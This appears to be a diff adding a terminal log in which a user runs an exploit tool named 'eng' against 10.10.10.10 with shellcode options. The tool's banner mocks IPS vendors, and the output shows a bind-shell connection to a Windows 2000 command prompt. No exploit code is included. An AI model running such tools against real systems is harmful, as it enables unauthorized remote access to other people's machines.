@@ -1,0 +1,18 @@
+[root@redhat src]# ./eng -d 10.10.10.10 --offset 1 --shellcode 0
+eng v4.23-public [built on Sep 18 2008 22:10:01]
+
+                          ,,,   '#,:#$#.   ,,,
+                        .#' `,  :#   '#; .#'  `,
+                        ##,,.'  $#    '# ##.  ,#
+                        '#:.,' ,:'   ,#' '#:.,#:
+                                             ##"
+                                         .  ##'
+                                          ````
+
+are you ready to write 1,745,353,423,278,047,232 new IPS signatures?
+trying to connect the bind shell... connected!!!
+Microsoft Windows 2000 [Version 5.00.2195]
+(C) Copyright 1985-1999 Microsoft Corp.
+
+C:\WINNT\system32>
+
